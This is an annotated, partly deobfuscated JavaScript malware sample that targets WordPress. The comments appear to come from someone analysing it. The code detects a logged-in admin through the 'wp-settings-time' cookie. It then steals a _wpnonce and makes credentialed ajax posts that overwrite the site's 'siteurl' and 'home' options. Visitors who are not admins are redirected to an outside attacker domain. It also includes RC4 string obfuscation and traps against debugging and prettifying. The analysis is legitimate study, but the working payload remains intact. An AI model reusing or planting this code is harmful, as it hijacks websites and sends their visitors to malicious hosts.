// This file has been prettified and optimised.
// Inline comments are my own.
/*/
function _oao() {
  var cookie = document.cookie.indexOf('wp-settings-time') !== -1;
  if (cookie) {
    return 1;
  }
  return 0;
}

var n = _oao();
if (n > 0) {
/*/ // This is equivalent
// Check if 'wp-settings-time' cooke is present:
if (document.cookie.indexOf('wp-settings-time') !== -1) {
  //*/

  // An array of length 53
  var _0x5112 = [
    "NMKJW8Orw40=", "w4N/JMORBsKYwo/CjVc=", "w5vCu39zwqPChsKweA==", "wrTCkw8Ww6FO",
    "eETDmktlT1rCokdowpoZw6AGw6LDg8OGwq/Dn8Oiwq7CmSkFfQHDn8Omwqg=", "b8KMSsKlw4nCiE3DjMOUw6QPwoTDkxXCocKCwoB2wop4wps=",
    "KXXCu1Vfw4PDoAo9wp3CtyAzQsK2ZVLDnxYdwqZnJUo=",
    "IRrCkcK5wr7CpMKTwrDCl8KBHcKjMwzCq8OvU8K4w7PCkcOww7UWECc1woLCrgnDoMKKw7BGw7jDjsKfw5BaS8Ofw64=", "V8OSw57Csl8UwqXDrcOFYA==",
    "DSsJ", "DMKtwp9lD8KrYMOJEMK+ScObWA==", "w4pPw6o=", "SSXDvD8=", "w5bCnnZIQw==", "w7rDsMOVwoE=", "YQbCgCg8w4c=", "w7vCkRR2YcKjwr4=",
    "RErCjDZ6csKO", "dg/Cn8Kjw47DncK1", "wqTDv8Krwrs=", "XG/Clh7Dq1zDk8OQ", "wp3Cj1FDE8KYwrtJbg==", "CcOgJsOL", "wo/CqcK9wrg=",
    "w4LDi8OywqXDvEBuw4PDlMKmHcOVwpvCvCLChsOww5bDjsKgwrBTw7IBJsOwwpt7GX7DgmhYw6sVwqgYw48=", "wqlUNGs6wpc5", "w5paIRt4",
    "w5tSwpDCu0DCjDLDu0k=", "DsOKAcK6wpzDng==", "w6NgfcK7PAwUwpo=", "wpPCv8K4wq3Dt8KA", "w6zCtsOqwoR3S3M=", "CFHDkWt/bcOU",
    "FcOFwo0=", "PQ8vw4o=", "T28APsOI", "w5fDsW7DvA==", "w53DksK9IcOJ", "PBbDj8Oow5TDmsOjRgM=", "DcOYwovCocKA", "w652J0QsdSo=",
    "GAXCig==", "wrheKnQ0wpg5", "w7jCuMO2wpk=", "w5vDj8KhPcOUVcOR", "XlR1w5LCkA==", "w5jCkGxYRMOwwoA=", "U19xw4g=", "w43Clm8ew4vDlSo=",
    "TngQJMOd", "w4VPw6PCqMOQwptj", "woLDiWliw4U8wqnChcOd", "KQEzw5fDisKOwqU="
  ];

  /*/ // After shuffle:
  [
    "w5paIRt4","w5tSwpDCu0DCjDLDu0k=","DsOKAcK6wpzDng==","w6NgfcK7PAwUwpo=","wpPCv8K4wq3Dt8KA",
    "w6zCtsOqwoR3S3M=","CFHDkWt/bcOU","FcOFwo0=","PQ8vw4o=","T28APsOI","w5fDsW7DvA==","w53DksK9IcOJ",
    "PBbDj8Oow5TDmsOjRgM=","DcOYwovCocKA","w652J0QsdSo=","GAXCig==","wrheKnQ0wpg5","w7jCuMO2wpk=",
    "w5vDj8KhPcOUVcOR","XlR1w5LCkA==","w5jCkGxYRMOwwoA=","U19xw4g=","w43Clm8ew4vDlSo=","TngQJMOd","w4VPw6PCqMOQwptj",
    "woLDiWliw4U8wqnChcOd","KQEzw5fDisKOwqU=","NMKJW8Orw40=","w4N/JMORBsKYwo/CjVc=","w5vCu39zwqPChsKweA==","wrTCkw8Ww6FO",
    "eETDmktlT1rCokdowpoZw6AGw6LDg8OGwq/Dn8Oiwq7CmSkFfQHDn8Omwqg=","b8KMSsKlw4nCiE3DjMOUw6QPwoTDkxXCocKCwoB2wop4wps=",
    "KXXCu1Vfw4PDoAo9wp3CtyAzQsK2ZVLDnxYdwqZnJUo=",
    "IRrCkcK5wr7CpMKTwrDCl8KBHcKjMwzCq8OvU8K4w7PCkcOww7UWECc1woLCrgnDoMKKw7BGw7jDjsKfw5BaS8Ofw64=",
    "V8OSw57Csl8UwqXDrcOFYA==","DSsJ","DMKtwp9lD8KrYMOJEMK+ScObWA==","w4pPw6o=","SSXDvD8=","w5bCnnZIQw==",
    "w7rDsMOVwoE=","YQbCgCg8w4c=","w7vCkRR2YcKjwr4=","RErCjDZ6csKO","dg/Cn8Kjw47DncK1","wqTDv8Krwrs=","XG/Clh7Dq1zDk8OQ",
    "wp3Cj1FDE8KYwrtJbg==","CcOgJsOL","wo/CqcK9wrg=",
    "w4LDi8OywqXDvEBuw4PDlMKmHcOVwpvCvCLChsOww5bDjsKgwrBTw7IBJsOwwpt7GX7DgmhYw6sVwqgYw48=","wqlUNGs6wpc5"
  ]

  /*/
  /**
   * @param {Array} _0x8fe4a0 The array
   * @param {number} _0x32c378
   */
  (function (_0x8fe4a0, _0x32c378) {
  // instantly called with (_0x5112, 0x123), so replacing that below

    /**
     * @param {number} shiftBy the number of positions (+2) to shift array postions of _0x8fe4a0 by
     */
    var _0x1a078c = function (shiftBy) {
      // Called below with the only parameter as 0x124
      while (--shiftBy) { // loops 0x123 times -> 291 times
        _0x5112['push'](_0x5112['shift']());  // This shuffles the first element to the last element
      }
    };

    var _0x595b5c = function () {
      var _0x5d25f0 = {
        'data': { 'key': 'cookie', 'value': 'timeout' }, 
        /**
         * 
         * @param {Array} _0x3708ac 
         * @param {*} _0x23dfb3 
         * @param {*} _0x598f54 
         * @param {Object} _0x12f5a1 
         */
        'setCookie': function (_0x3708ac, _0x23dfb3, _0x598f54, _0x12f5a1) {
          _0x12f5a1 = _0x12f5a1 || {};
          var _0x5f403b = _0x23dfb3 + '=' + _0x598f54;

          var _0x300863 = 0;
          // Another infinite trap if _0x3708ac has length > 0
          // for (var _0x300863 = 0, _0x1550d4 = _0x3708ac.length; _0x300863 < _0x1550d4; _0x300863++) {
          //   var _0x1a778a = _0x3708ac[_0x300863];
          //   _0x5f403b += '; ' + _0x1a778a;
          //   var _0x338aad = _0x3708ac[_0x1a778a];
          //   _0x3708ac['push'](_0x338aad); // pushes a value to the array
          //   _0x1550d4 = _0x3708ac.length; // also increments the exit condition
          //   if (_0x338aad !== true) {
          //     _0x5f403b += '=' + _0x338aad;
          //   }
          // } 
          _0x12f5a1['cookie'] = _0x5f403b;
        }, 
        'removeCookie': function () {
          return 'dev';
        }, 
        'getCookie': function (_0x4af13f, _0x30ddb0) {
          _0x4af13f = _0x4af13f || function (_0x3e9f12) {
            return _0x3e9f12;
          };

          var _0x373b08 = _0x4af13f(new RegExp('(?:^|; )' + _0x30ddb0['replace'](/([.$?*|{}()[]\/+^])/g, '$1') + '=([^;]*)'));
          
          var _0x2881e6 = function (_0x320978, _0x29daa6) {
            // Only called below, where second param is 0x123, which is incremented before the next call
            _0x320978(0x124);
          };

          _0x2881e6(_0x1a078c, 0x123);
          return _0x373b08 ? decodeURIComponent(_0x373b08[0x1]) : undefined;
        }
      };
      var _0x3b02fb = function () {
        var _0x356883 = new RegExp('\\w+ *\\(\\) *{\\w+ *[\'|"].+[\'|"];? *}');
        return _0x356883['test'](_0x5d25f0['removeCookie']['toString']());
      };

      _0x5d25f0['updateCookie'] = _0x3b02fb;
      // var _0x5cb7e3 = ''; // Code linters reckon these are unused
      var _0x1b3a37 = _0x5d25f0['updateCookie']();
      
      if (!_0x1b3a37) {
        _0x5d25f0['setCookie'](['*'], 'counter', 0x1);
      } else if (_0x1b3a37) {
        _0x5cb7e3 = _0x5d25f0['getCookie'](null, 'counter');
      } else {
        _0x5d25f0['removeCookie']();
      }
    };
    _0x595b5c();
  }(_0x5112, 0x123));


  /**
   * This function takes in parameter to retrieve strings for other locations in the code
   * @param {string} _0x5e10dc string representation of a number
   * @param {string} _0x3184f5 (? possibly a masking system?)
   * @returns {string} a string used for method calls
   */
  var _0x55dc = function (_0x5e10dc, _0x3184f5) {
    _0x5e10dc = _0x5e10dc - 0; // For string to number conversion
    var _0x33a72a = _0x5112[_0x5e10dc];

    // -- Initialisation of this class -- //
    if (_0x55dc.isInitialised === undefined) {

      // This part makes sure there's an `atob` function in global scope, so it can be accessed as just `atob()` later
      (function () {
        // Get a reference to the global scope: `window` for browsers, `global` in NodeJs
        var envGlobalRef = typeof window !== 'undefined' ? window : typeof process === 'object' && typeof require === 'function' && typeof global === 'object' ? global : this;
        var _0x5a8e2c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
        
        // Attach an atob (decodes base64) function if it doesn't exist (Doesn't exist in NodeJs)
        envGlobalRef['atob'] || (envGlobalRef['atob'] = function (_0x75ae15) {
          var _0x20a7da = String(_0x75ae15)['replace'](/=+$/, '');
          for (
            var _0xcc5ce7 = 0, _0x5754ac, _0x5308e2, _0x3cb106 = 0, _0x392158 = '';
            _0x5308e2 = _0x20a7da['charAt'](_0x3cb106++);
            ~_0x5308e2 && (_0x5754ac = _0xcc5ce7 % 0x4 ? _0x5754ac * 0x40 + _0x5308e2 : _0x5308e2, _0xcc5ce7++ % 0x4) ? _0x392158 += String['fromCharCode'](0xff & _0x5754ac >> (-0x2 * _0xcc5ce7 & 0x6)) : 0) {
            _0x5308e2 = _0x5a8e2c['indexOf'](_0x5308e2);
          }
          return _0x392158;
        });

      }());


      /**
       * @param {string} _0x1f7823 Base64 encoded value
       * @param {string} str2 String (Used later with 'charCodeAt)
       * @returns {string}
       */
      var _0x2ca3a9 = function (b64String, str2) {

        var numberArray = [], 
        // _0x6e642c = 0, // Moved closer to use
        temp, // Used for holding values when shuffling
        newString = '', 
        // _0x58b7c1 = ''; // only used in nop encode/decode sequence
        str1 = atob(b64String);  // decode base64 (i've moved it to a new variable)

        // // For the length of the decoded string, URIencode
        // for (var _0x39fa62 = 0, _0x31aa32 = str1.length; _0x39fa62 < _0x31aa32; _0x39fa62++) {
        //   // Convert to url encoded value (%XX)
        //   _0x58b7c1 += '%' + ('00' + str1['charCodeAt'](_0x39fa62)['toString'](0x10))['slice'](-0x2);
        // }

        // // Then decode it again, so a null action
        // str1 = decodeURIComponent(_0x58b7c1);


        // Fill numberArray with values 0-255 in the matching indexes
        for (var i = 0; i < 256; i++) {
          numberArray[i] = i;
        }

        var y = 0;
        // Loop 255 times, y starts at 0
        for (i = 0; i < 256; i++) {
          y = (y + numberArray[i] + str2['charCodeAt'](i % str2.length)) % 256;
          temp = numberArray[i];
          numberArray[i] = numberArray[y];
          numberArray[y] = temp;
        }

        x = 0;
        y = 0;
        for (var i = 0; i < str1.length; i++) {
          // Increment x, but not over 255
          x = (x + 1) % 256;
          //
          y = (y + numberArray[x]) % 256;
          temp = numberArray[x];
          numberArray[x] = numberArray[y];
          numberArray[y] = temp;
          newString += String.fromCharCode(str1.charCodeAt(i) ^ numberArray[(numberArray[x] + numberArray[y]) % 256]);
        }

        return newString;
      };

      //-----------------//

      _0x55dc['qzDpiD'] = _0x2ca3a9;
      _0x55dc['opEaeu'] = {};
      _0x55dc.isInitialised = true;
    }

    if (_0x55dc['EKjoEU'] === undefined) {
      var _0x29532a = function (_0x2babe0) {
        this['IWaIAq'] = _0x2babe0;
        this['LhXTbG'] = [1, 0, 0];
        this['nssEcv'] = function () {
          return 'newState';
        };
      };

      _0x29532a['prototype']['GDOUhs'] = function () {
        // var _0x2112f8 = new RegExp('\\w+ *\\(\\) *{\\w+ *[\'|"].+[\'|"];? *}');
        var _0x2112f8 = /\w+ *\(\) *{\w+ *['|"].+['|"];? *}/;

        // This could be checking if the file has been prettified, as prettification would likely add newlines to the function `this['nssEcv']`
        // in the original it's `this['nssEcv']=function(){return'newState';}`, which passes the regex
        var _0x42fc30 = _0x2112f8.test(this['nssEcv']['toString']()) ? 
          --this['LhXTbG'][0x1] : // intended path
          --this['LhXTbG'][0];  // prettified path

        return this['JNhbcC'](_0x42fc30);
      };

      _0x29532a['prototype']['JNhbcC'] = function (_0x45742f) {
        // Only true if _0x45742f is > 0xFFFFFFFF (bitwise not is only false if it was previously all 1's. And numbers are stored as 32 bits)
        if (!Boolean(~_0x45742f)) {
          return _0x45742f;
        }
        return this['PvaEUj'](this['IWaIAq']);
      };

      /**
       * Trapping function: if `this['LhXTbG'].length > 0`, loops infinitely (until array can't add more values)
       * else, calls `_0x4abac2` with `this['LhXTbG'][0]` (which would be `undefined`)
       * @param {function} _0x4abac2 a function to call
       */
      _0x29532a['prototype']['PvaEUj'] = function (_0x4abac2) {
        // Infinite loop, unless `this['LhXTbG'].length === 0`, in which case loop never runs.
        // (otherwise both _0x287b4a and _0x1a9e9e are incremented by one every loop)
        for (var _0x287b4a = 0, _0x1a9e9e = this['LhXTbG'].length; _0x287b4a < _0x1a9e9e; _0x287b4a++) {
          // Randomly push 0 or 1
          this['LhXTbG'].push(Math.round(Math.random()));
          _0x1a9e9e = this['LhXTbG'].length; // increments _0x1a9e9e by 1 (because length of array above has been incremented by the push)
        }
        // return _0x4abac2(this['LhXTbG'][0]);
        return _0x4abac2(undefined);  // because of trap loop above, this only gets called if this['LhXTbG'].length === 0, so the value would be undefined.
      };

      new _0x29532a(_0x55dc)['GDOUhs']();
      _0x55dc['EKjoEU'] = true;
    }


    _0x33a72a = _0x55dc['qzDpiD'](_0x33a72a, _0x3184f5);  // This function is `_0x2ca3a9`, 
    _0x55dc['opEaeu'][_0x5e10dc] = _0x33a72a;

    return _0x33a72a;
  };

  // Function one time wrapper
  // returns a wrapper that, when called the first time with an argument and a function, provides a function that calls that
  // Later uses will return a blank function.
  var _0x578c35 = function () {
    var flag = true;

    // Returned wrapper: 
    return function (_0x55e959, _0x2e45c6) {
      let returnVal;
      if(flag) {
        returnVal = function() {
          if (_0x2e45c6) {
            var _0x488be0 = _0x2e45c6['apply'](_0x55e959, arguments);
            _0x2e45c6 = null;
            return _0x488be0;
          }

        }
      } else {
        returnVal = function () {};
      }
      flag = false;
      return returnVal;
    };
  }();

  var _0x15e697 = _0x578c35(this, function () {
    
    // Code linters reckon these are unused
    // var _0x6731b1 = function () {
    //   return 'dev';
    // },

    // _0x4e0009 = function () {
    //   return 'window';
    // };

    // var _0x992916 = function () {
    //   var _0x1dcaaf = new RegExp('\\w+ *\\(\\) *{\\w+ *[\'|"].+[\'|"];? *}');
    //   return !_0x1dcaaf['test'](_0x6731b1['toString']());
    // };

    // var _0x2e8d58 = function () {
    //   var _0x1342c5 = new RegExp('(\\\\[x|u](\\w){2,4})+');
    //   return _0x1342c5['test'](_0x4e0009['toString']());
    // };

    // The following pairs of functions just waste time, calling each other until a false event and not changing any state.
    /**
     * @param {String|Array} _0x441288 
     */
    var _0x3ef9af = function (_0x441288) {
      if (_0x441288['indexOf']('i' === 0)) {
        _0x41f705(_0x441288);
      }
    };

    /**
     * @param {String|Array} _0x54ba12
     */
    var _0x41f705 = function (_0x54ba12) {
      if (_0x54ba12['indexOf'](true) !== 0) {
        _0x3ef9af(_0x54ba12);
      }
    };


    /*/ // Original
    if (!_0x992916()) {
      if (!_0x2e8d58()) {
        _0x3ef9af('indexOf')
      } else {
        _0x3ef9af('indexOf');
      }
    } else {
      _0x3ef9af('indexOf');
    }
    /*/ //Turns out this is the same call no matter what...
    _0x3ef9af('indexOf'); // Beginning of time waste calls (_0x3ef9af -> _0x41f705 -> _0x3ef9af -> void return)
    //*/

  });

  _0x15e697();

// create a "call once" wrapper for a function
  var _0x48b5a1 = function () {
    var flag = true;


    /**
     * @param {object} _0x7f1f15 An object with a method on `_0x55dc('0', 'wNzi')`
     */
    return function (_0x37b4bb, _0x7f1f15) {
      // Only returns a useful function the first time
      var _0x467e4d = flag ? function () {
        if (_0x7f1f15) {
          var _0x4ab9b8 = _0x7f1f15[_0x55dc('0', 'wNzi')](_0x37b4bb, arguments);
          _0x7f1f15 = null;
          return _0x4ab9b8;
        }
      } : function () { };
      flag = false;
      return _0x467e4d;
    };
  }();

  var _0x454be7 = _0x48b5a1(this, function () {
    var emptyFunc = function () { };

    // Get a global reference
    var globalWindow = (typeof window !== _0x55dc('0x1', 'Rl0Q')) ? 
      window : 
      typeof process === _0x55dc('0x2', 'h%a7') 
        && typeof require === _0x55dc('0x3', 'nh)U') 
        && typeof global === _0x55dc('0x4', 'nGIV') ? global : this;

    if (!globalWindow[_0x55dc('0x5', 'k6$s')]) {
      globalWindow[_0x55dc('0x6', 'E(Sy')] = function (_emptyFunc) {
        var obj = {};
        obj[_0x55dc('0x7', '3G3[')] = _emptyFunc;
        obj[_0x55dc('0x8', 'LbLs')] = _emptyFunc;
        obj[_0x55dc('0x9', 'cKx6')] = _emptyFunc;
        obj[_0x55dc('0xa', 'bRZT')] = _emptyFunc;
        obj[_0x55dc('0xb', '[sQb')] = _emptyFunc;
        obj[_0x55dc('0xc', '5N7U')] = _emptyFunc;
        obj[_0x55dc('0xd', '3G3[')] = _emptyFunc;
        return obj;
      }(emptyFunc);

    } else {
      globalWindow[_0x55dc('0xe', 'nK5Q')][_0x55dc('0xf', 'zq7V')] = emptyFunc;
      globalWindow[_0x55dc('0x10', '*qHT')][_0x55dc('0x11', 'k6$s')] = emptyFunc;
      globalWindow[_0x55dc('0x12', '[sQb')][_0x55dc('0x13', 'YNZr')] = emptyFunc;
      globalWindow[_0x55dc('0x14', '57NI')][_0x55dc('0x15', 'YNZr')] = emptyFunc;
      globalWindow[_0x55dc('0x16', 'D#ou')][_0x55dc('0x17', 'cKx6')] = emptyFunc;
      globalWindow[_0x55dc('0x18', 'szLW')][_0x55dc('0x19', 'bQRK')] = emptyFunc;
      globalWindow[_0x55dc('0x1a', 'LbLs')][_0x55dc('0x1b', 'VWn3')] = emptyFunc;
    }
  });

  _0x454be7();

  // An array of strings, used for method calls later
  var _0x3de650 = [
    _0x55dc('0x1c', 'ouTR'),  // 0, 0x00 : 
    _0x55dc('0x1d', 'pQwL'),  // 1, 0x01
    '//',                     // 2, 0x02
    _0x55dc('0x1e', '7Gn)'),  // 3, 0x03 : 
    _0x55dc('0x1f', 'hbB#'),  // 4
    _0x55dc('0x20', 'VWn3'),
    _0x55dc('0x21', 'P[RT'),
    _0x55dc('0x22', 'A[tK'),
    _0x55dc('0x23', '&zYW'),
    _0x55dc('0x24', 'LbLs'),  // 9
    _0x55dc('0x25', 'wL&F'),  //10
    _0x55dc('0x26', 'szLW'),  //11
    _0x55dc('0x27', 'WKAi'),  //12
    _0x55dc('0x28', '57NI'),
    _0x55dc('0x29', 'l5iB'),  //14
    _0x55dc('0x2a', 'Qjwy'),  //15, 0x0f : ??? (this is the action the second request performs)
    _0x55dc('0x2b', '7HUU'),  //16, 0x10 : 
    _0x55dc('0x2c', 'E(Sy'),  //17, 0x11
    _0x55dc('0x2d', '5N7U'),  //18
    _0x55dc('0x2e', 'WExz'),  //19, 0x13
    _0x55dc('0x2f', 'mMcq'),  //20, 0x14 : 
    _0x55dc('0x30', '8]4k'),  //21, 0x15 : 
    _0x55dc('0x31', 'CtZK'),  //22, 0x16 : 'ajax'?
    _0x55dc('0x32', 'nGIV'),  //23, 0x17 : 'stop' // Assumed from inference below
    _0x55dc('0x33', 'l5iB'),  //24, 0x18 : 'replace'
    _0x55dc('0x34', '*qHT')   //25, 0x19 : ???
  ];

  if (typeof ExploitOn == _0x3de650[0]) {
    ExploitOn = true;
    var _0x4fd50b = location[_0x3de650[0x1]] + _0x3de650[0x2] + document[_0x3de650[0x3]];
    var _0x3b1269 = _0x4fd50b + _0x3de650[0x4];
    var _0x52a5e2 = _0x4fd50b + _0x3de650[0x5];
    var _0x315d2d = _0x4fd50b + _0x3de650[0x6];
    var _0x55592c = _0x3de650[0x7];
    var _0x5da3db = jQuery[_0x3de650[0x8]]();

    // Looks like Ajax?
    _0x5da3db[/*_0x3de650[0x16]*/ 'ajax']({
      'url': _0x3b1269,
      'method': _0x3de650[0x9],
      'crossDomain': true,
      'success': function (_0x23c684) {
        console[_0x3de650[0xb]](_0x3de650[0xa]);
        var wpnonceRegex = /name="_wpnonce"([ ]+)value="([^"]+)"/g;
        var _0x3e489c = wpnonceRegex[_0x3de650[0xc]](_0x23c684);
        if (_0x3e489c[0x2][_0x3de650[0xd]](/([a-z0-9]{10})/)) {
          var _0x4cc569 = _0x3e489c[0x2];
          _0x5da3db[/*_0x3de650[0x16]*/ 'ajax']({
            'url': _0x52a5e2,
            'method': _0x3de650[0xe],
            'data': {
              'action': _0x3de650[0xf],
              '_wpnonce': _0x4cc569,
              '_wp_http_referer': _0x3de650[0x4],
              'option_page': _0x3de650[0x10],
              'siteurl': _0x55592c + _0x3de650[0x11],
              'home': _0x55592c + _0x3de650[0x12]
            },
            'xhrFields': {
              'withCredentials': true,
            },
            'crossDomain': true,
            'success': function (_0x23c684) {
              _0x5da3db[/*_0x3de650[0x16]*/ 'ajax']({
                'url': _0x315d2d,
                'method': _0x3de650[0xe],
                'data': {
                  'action': _0x3de650[0x13],
                  'permalink_structure': 0x1
                },
                'success': function () {
                  window[_0x3de650[0x14]] = window[_0x3de650[0x14]] + _0x3de650[0x15];
                }
              });
            }
          });
        } else {
          /*/
          // This looks like it could be window.stop(), location.replace();
          window[_0x3de650[0x17]]();  
          location[_0x3de650[0x19]](_0x3de650[0x18]);
          /*/
          window.stop();  
          location.replace(_0x3de650[0x18]);
          //*/
        }
      }
    });
  }

} else {
  // 'wp-settings-time' not present in cookies:
  /******bzlaafuloc******/
  window.stop();
  var sdgh = 'ynyqbqvljwpqwd';
  /*rryrcaqoart*/
  // Redirection:
  location.replace('https://capital.belaterbewasthere.com/len.php?s=678&_id=129843478&utm=gfhklew45');
}
